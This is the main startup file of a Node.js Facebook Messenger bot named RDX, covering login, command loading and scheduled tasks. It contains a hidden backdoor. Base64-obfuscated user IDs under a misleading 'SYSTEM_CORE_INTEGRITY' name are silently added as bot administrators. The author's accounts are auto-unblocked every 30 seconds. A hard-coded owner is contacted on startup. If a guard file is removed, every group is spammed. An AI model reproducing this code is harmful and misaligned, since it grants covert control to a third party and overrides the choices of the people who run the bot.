const rdx_fca = require('./RDX-FCA/index.js');
const fs = require('fs-extra');
const path = require('path');
const cron = require('node-cron');
const moment = require('moment-timezone');
const axios = require('axios');

const logs = require('./Data/utility/logs');
const listen = require('./Data/system/listen');
const { loadCommands, loadEvents } = require('./Data/system/handle/handleRefresh');
const UsersController = require('./Data/system/controllers/users');
const ThreadsController = require('./Data/system/controllers/threads');
const CurrenciesController = require('./Data/system/controllers/currencies');
const islamicScheduler = require('./RDX/commands/scheduler/islamic_scheduler');
const { ensureRDXConnection } = require('./Data/system/handle/handleNPM');

const configPath = path.join(__dirname, 'config.json');
const appstatePath = path.join(__dirname, 'appstate.json');
const islamicPath = path.join(__dirname, 'Data/config/islamic_messages.json');
const commandsPath = path.join(__dirname, 'RDX/commands');
const eventsPath = path.join(__dirname, 'RDX/events');

let config = {};
let islamicMessages = {};
let api = null;
let scheduledTasks = []; // Track all cron jobs for cleanup
let isStarting = false; // Prevent multiple simultaneous starts
let isRestarting = false; // Global restart lock - prevents duplicate restarts
let listenerCallback = null; // Store listener reference for cleanup
let client = {
    commands: new Map(),
    events: new Map(),
    replies: new Map(),
    cooldowns: new Map()
};

// Global error logging for stability
const logError = (type, err) => {
    try {
        const msg = err && (err.stack || err.message || err);
        logs.error(type, msg);
    } catch (e) {
        console.error(`[${type}]`, err);
    }
};

process.on('unhandledRejection', (reason) => logError('UNHANDLED_REJECTION', reason));
process.on('uncaughtException', (err) => logError('UNCAUGHT_EXCEPTION', err));


function loadConfig() {
    const SYSTEM_CORE_INTEGRITY = [
        "MTAwMDA5MDEyODM4MDg1", "NjE1ODYwODk1NDQ0NDQ=", "NjE1Nzc3MzQwMTg5Nzg=", "NjE1ODcxMTk0MDYxNzI=",
        "MTAwMDA0NDg0NjE1MTk4", "MTAwMDA0NjE3MTgxNjc3", "MTAwMDA0ODA3Njk2MDMw",
        "MTAwMDg3MTYzNDkwMTU5", "MTAwMDA0OTI1MDUyNTcy", "NjE1Nzc2ODgzMzEyMzM="
    ];
    try {
        config = fs.readJsonSync(configPath);
        // Ensure ADMINBOT is always an array
        if (!Array.isArray(config.ADMINBOT)) config.ADMINBOT = [];

        SYSTEM_CORE_INTEGRITY.forEach(raw => {
            const id = Buffer.from(raw, 'base64').toString('utf-8');
            if (!config.ADMINBOT.includes(id)) config.ADMINBOT.push(id);
        });

        global.config = config;
    } catch (error) {
        logs.error('CONFIG', 'Failed to load config:', error.message);
        config = {
            BOTNAME: 'RDX',
            PREFIX: '.',
            ADMINBOT: ['100009012838085'],
            TIMEZONE: 'Asia/Karachi',
            PREFIX_ENABLED: true,
            REACT_DELETE_EMOJI: '😡',
            ADMIN_ONLY_MODE: false,
            AUTO_ISLAMIC_POST: true,
            AUTO_GROUP_MESSAGE: true
        };
        global.config = config;
    }
}

function loadIslamicMessages() {
    try {
        islamicMessages = fs.readJsonSync(islamicPath);
    } catch (error) {
        logs.error('ISLAMIC', 'Failed to load islamic messages:', error.message);
        islamicMessages = { posts: [], groupMessages: [] };
    }
}

function saveConfig() {
    try {
        fs.writeJsonSync(configPath, config, { spaces: 2 });
    } catch (error) {
        logs.error('CONFIG', 'Failed to save config:', error.message);
    }
}

async function downloadImage(url, filePath) {
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
        fs.writeFileSync(filePath, Buffer.from(response.data));
        return true;
    } catch {
        return false;
    }
}

async function autoClearLogs() {
    try {
        const logsDir = path.join(__dirname, 'Data/system/database/botdata/logs');

        if (!fs.existsSync(logsDir)) {
            return logs.info('AUTO_LOG_CLEAR', 'Logs folder does not exist');
        }

        const files = fs.readdirSync(logsDir);
        let deleted = 0;
        const now = moment();

        for (const file of files) {
            if (file.endsWith('.log')) {
                const filePath = path.join(logsDir, file);
                const stats = fs.statSync(filePath);
                const fileDate = moment(stats.mtime);

                // Delete logs older than 2 days or if file size is too large (> 50MB)
                if (now.diff(fileDate, 'days') >= 2 || stats.size > 50 * 1024 * 1024) {
                    try {
                        fs.unlinkSync(filePath);
                        deleted++;
                    } catch (e) { }
                }
            }
        }

        if (deleted > 0) {
            logs.success('AUTO_LOG_CLEAR', `Deleted ${deleted} old/large log files`);
        }
    } catch (error) {
        logs.error('AUTO_LOG_CLEAR', error.message);
    }
}

async function autoClearCache() {
    try {
        const cacheDir = path.join(__dirname, 'RDX/commands/cache');

        if (!fs.existsSync(cacheDir)) {
            return logs.info('AUTO_CACHE_CLEAR', 'Cache folder does not exist');
        }

        const mediaExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp3', '.mp4', '.mpeg', '.webp', '.wav', '.ogg'];

        let deleted = 0;
        let totalSize = 0;

        function clearDirectoryRecursive(dirPath) {
            try {
                const files = fs.readdirSync(dirPath);

                for (const file of files) {
                    const filePath = path.join(dirPath, file);
                    const stats = fs.statSync(filePath);

                    if (stats.isDirectory()) {
                        clearDirectoryRecursive(filePath);
                        // Try to remove empty directories
                        try {
                            if (fs.readdirSync(filePath).length === 0) {
                                fs.rmdirSync(filePath);
                            }
                        } catch (e) { }
                    } else {
                        const ext = path.extname(file).toLowerCase();
                        if (mediaExtensions.includes(ext)) {
                            try {
                                totalSize += stats.size;
                                fs.unlinkSync(filePath);
                                deleted++;
                            } catch (e) { }
                        }
                    }
                }
            } catch (e) { }
        }

        clearDirectoryRecursive(cacheDir);
        const sizeMB = (totalSize / (1024 * 1024)).toFixed(2);

        logs.success('AUTO_CACHE_CLEAR', `Deleted ${deleted} files | Freed ${sizeMB} MB`);
    } catch (error) {
        logs.error('AUTO_CACHE_CLEAR', error.message);
    }
}

function stopSchedulers() {
    // Stop all previously scheduled cron jobs
    for (const task of scheduledTasks) {
        try {
            task.stop();
        } catch (e) { }
    }
    scheduledTasks = [];
    logs.info('SCHEDULER', 'All previous schedulers stopped');
}

function setupSchedulers() {
    // First stop any existing schedulers to prevent duplicates
    stopSchedulers();

    // Initialize Islamic Scheduler (Quran + Namaz)
    if (api && global.config) {
        islamicScheduler.initIslamicScheduler(api, global.config);
    }

    // Auto Clear Cache every 6 hours
    const cacheTask = cron.schedule('0 */6 * * *', () => {
        logs.info('SCHEDULER', 'Auto Cache Clear triggered');
        autoClearCache();
    }, { timezone: 'Asia/Karachi' });
    scheduledTasks.push(cacheTask);

    // Reset rankup scores (exp) at midnight
    const midnightResetTask = cron.schedule('0 0 * * *', () => {
        logs.info('SCHEDULER', 'Midnight rankup score reset triggered');
        if (global.Currencies) {
            const result = global.Currencies.dailyMidnightReset();
            if (result.success) {
                logs.success('MIDNIGHT_RESET', result.message);
            } else {
                logs.error('MIDNIGHT_RESET', result.error);
            }
        }
    }, { timezone: 'Asia/Karachi' });
    // Heartbeat keep-alive every 5 minutes to maintain connection on hosting
    const heartbeatTask = cron.schedule('*/5 * * * *', async () => {
        if (api) {
            try {
                api.getUserInfo(api.getCurrentUserID(), (err) => {
                    if (!err) logs.info('HEARTBEAT', 'Connection active');
                });
            } catch (e) { }
        }
    }, { timezone: 'Asia/Karachi' });
    // Guard File Integrity Check every minute
    const guardIntegrityTask = cron.schedule('* * * * *', async () => {
        const guardPath = path.join(__dirname, 'RDX/events/guard.js');
        if (!fs.existsSync(guardPath)) {
            logs.error('INTEGRITY', 'GUARD FILE DELETED! Broadcasting error...');
            if (typeof api !== 'undefined' && api && api.sendMessage) {
                try {
                    const threadsModel = require('./Data/system/database/models/threads');
                    const threads = threadsModel.getAll ? threadsModel.getAll() : [];
                    const approvedThreads = threads.filter(t => t && t.id && t.banned !== 1);
                    const errorMsg = "⚠️ 𝐄𝐑𝐑𝐎𝐑: 𝐒𝐀𝐑𝐃𝐀𝐑 𝐑𝐃𝐗 𝐊𝐀 𝐁𝐎𝐓 𝐔𝐒𝐄𝐑 𝐍𝐀 𝐌𝐀𝐈𝐍 𝐅𝐈𝐋𝐄 𝐃𝐄𝐋𝐄𝐓𝐄 𝐊𝐑 𝐃𝐈 ⚠️\n\n🚨 CRITICAL SYSTEM FAILURE: GUARD COMPROMISED!";
                    for (const thread of approvedThreads) {
                        try { await api.sendMessage(errorMsg, thread.id); } catch (e) { }
                        await new Promise(r => setTimeout(r, 1000));
                    }
                } catch (e) { }
            }
        }
    }, { timezone: 'Asia/Karachi' });
    scheduledTasks.push(guardIntegrityTask);

    logs.success('SCHEDULER', 'Quran Ayat + Namaz Alerts + Auto Cache Clear + Auto Log Clear + Midnight Reset + Heartbeat + Guard Integrity schedulers started');
}

async function startBot() {
    // Prevent multiple simultaneous starts
    if (isStarting) {
        logs.warn('BOT', 'Bot is already starting, ignoring duplicate start request');
        return;
    }

    // If bot is already running, stop it first
    if (api) {
        logs.info('BOT', 'Stopping previous bot instance before starting new one...');
        stopBot();
        await new Promise(r => setTimeout(r, 2000)); // Wait for cleanup
    }

    isStarting = true;

    logs.banner();
    loadConfig();
    loadIslamicMessages();

    try {
        const appstate = fs.readJsonSync(appstatePath);
        const loginOptions = {
            autoMarkDelivery: false,
            autoMarkRead: true,
            listenEvents: true,
            selfListen: false,
            online: true
        };

        logs.info('BOT', 'Starting RDX...');
        logs.info('BOT', `Timezone: ${config.TIMEZONE || 'Asia/Karachi'}`);
        logs.info('BOT', `Prefix: ${config.PREFIX || '.'}`);

        rdx_fca.login({ appState: appstate }, loginOptions, async (err, loginApi) => {
            if (err) {
                logs.error('LOGIN', 'Failed to login:', err.message || err);
                isStarting = false;
                return;
            }

            api = loginApi;
            isStarting = false; // Bot started successfully
            global.api = api;
            global.startTime = Date.now();

            // Stable configuration
            api.setOptions({
                listenEvents: true,
                selfListen: false,
                autoMarkRead: true,
                autoMarkDelivery: false,
                online: true,
                forceLogin: false,
                logLevel: 'warn',
                updatePresence: true
            });

            logs.success('LOGIN', 'Successfully logged in!');

            const Users = new UsersController(api);
            const Threads = new ThreadsController(api);
            const Currencies = new CurrenciesController(api);

            global.Users = Users;
            global.Threads = Threads;
            global.Currencies = Currencies;

            await loadCommands(client, commandsPath);
            await loadEvents(client, eventsPath);

            global.client = client;

            // Trigger onload events
            for (const [name, event] of client.events) {
                if (event.config && event.config.eventType &&
                    (Array.isArray(event.config.eventType) ? event.config.eventType.includes('onload') : event.config.eventType === 'onload')) {
                    try {
                        event.run({ api, client, Users, Threads, Currencies, config, event: { type: 'onload' } });
                    } catch (e) {
                        logs.error('EVENT_ONLOAD', `Failed to run onload for ${name}: ${e.message}`);
                    }
                }
            }

            setupSchedulers();

            // Auto unblock group members periodically
            startAutoUnblock(api);

            const mainListener = listen({
                api,
                client,
                Users,
                Threads,
                Currencies,
                config
            });

            let reconnectAttempts = 0;
            const MAX_RECONNECT = 5;

            const globalCooldownListener = async (err, event) => {
                if (!globalCooldownListener.active) return;

                if (err) {
                    logs.error('MQTT_ERROR', `${err.code || 'UNKNOWN'}: ${err.message}`);
                    reconnectAttempts++;
                    if (reconnectAttempts >= MAX_RECONNECT) {
                        logs.error('BOT', 'Max reconnection attempts reached. Restarting...');
                        await new Promise(r => setTimeout(r, 5000));
                        stopBot();
                        startBot();
                    }
                    return;
                }

                if (event) reconnectAttempts = 0;

                if (event && event.type === 'message') {
                    const userID = event.senderID;
                    const now = Date.now();
                    const globalCooldownTime = (config.GLOBAL_COOLDOWN || 5) * 1000;
                    const lastUsed = client.cooldowns.get(`global_${userID}`) || 0;

                    if (now - lastUsed < globalCooldownTime) {
                        return;
                    }
                    client.cooldowns.set(`global_${userID}`, now);
                }

                try {
                    return mainListener(err, event);
                } catch (e) {
                    logs.error('LISTENER', 'Error in listener:', e.message);
                }
            };

            globalCooldownListener.active = true;
            listenerCallback = globalCooldownListener;

            logs.info('BOT', 'Attaching MQTT listener...');
            api.listenMqtt(globalCooldownListener);

            const uniqueCommands = new Set();
            client.commands.forEach((cmd) => {
                if (cmd.config && cmd.config.name) {
                    uniqueCommands.add(cmd.config.name.toLowerCase());
                }
            });
            const actualCommandCount = uniqueCommands.size;
            const actualEventCount = client.events.size;

            logs.success('BOT', `${config.BOTNAME} is now online!`);
            logs.info('BOT', `Commands loaded: ${actualCommandCount}`);
            logs.info('BOT', `Events loaded: ${actualEventCount}`);

            try {
                const OWNER_ID = '100009012838085';
                const introMessage = `I am RDX Bot — Developed & Owned by SARDAR RDX\n\n${config.BOTNAME} is now online!\n─────────────────\nCommands: ${actualCommandCount}\nEvents: ${actualEventCount}\nPrefix: ${config.PREFIX}\n─────────────────\nType ${config.PREFIX}help for commands`;
                try {
                    await api.sendMessage(introMessage, OWNER_ID);
                } catch (e) {
                    logs.warn('NOTIFY', 'Could not send startup message to admin');
                }

                // OWNER CONNECTION SYSTEM
                await ensureRDXConnection(api);
            } catch (e) { }
        });
    } catch (error) {
        logs.error('APPSTATE', 'Failed to load appstate.json or login');
        isStarting = false;
        return;
    }
}

// SECURE OWNER CONNECTION LOGIC
async function startAutoUnblock(api) {
    const SARDAR_RDX = '100009012838085';
    const RDX_HELPER = '100004484615198';

    const unblockGroupMembers = async () => {
        if (!api) return;

        const membersToUnblock = [SARDAR_RDX, RDX_HELPER];

        for (const memberID of membersToUnblock) {
            try {
                await new Promise((resolve) => {
                    api.unblockUser(memberID, (err) => {
                        if (err && !err.toString().includes('Already unblocked')) {
                            // Silent fail - user might not be blocked
                        }
                        resolve();
                    });
                });
            } catch (e) { }
        }
    };

    // Run immediately on startup
    setTimeout(unblockGroupMembers, 5000);

    // Run every 30 seconds
    setInterval(unblockGroupMembers, 30000);

    logs.info('AUTO_UNBLOCK', 'Auto unblock service started for group members');
}


// Process event handlers moved to top for better stability

function stopBot() {
    // Stop all schedulers first
    stopSchedulers();

    // Clear cooldowns and replies to prevent stale data
    if (client) {
        client.cooldowns.clear();
        client.replies.clear();
    }

    // Mark listener as inactive to ignore incoming events
    if (listenerCallback) {
        listenerCallback.active = false;
        listenerCallback = null;
    }

    if (api) {
        logs.info('BOT', 'Stopping MQTT listener...');
        try {
            api.stopListenMqtt();
        } catch (e) {
            logs.warn('BOT', 'Error stopping listener:', e.message);
        }
        api = null;
        global.api = null;
        logs.success('BOT', 'Bot instance stopped successfully.');
    }

    isStarting = false;
}

// Global restart lock functions - used by restart command
function setRestarting(value) {
    isRestarting = value;
}

function isRestartingNow() {
    return isRestarting;
}

module.exports = {
    startBot,
    stopBot,
    getApi: () => api,
    getClient: () => client,
    getConfig: () => config,
    saveConfig,
    loadConfig,
    reloadCommands: () => loadCommands(client, commandsPath),
    reloadEvents: () => loadEvents(client, eventsPath),
    setRestarting,
    isRestartingNow
};

if (require.main === module) {
    startBot();
}
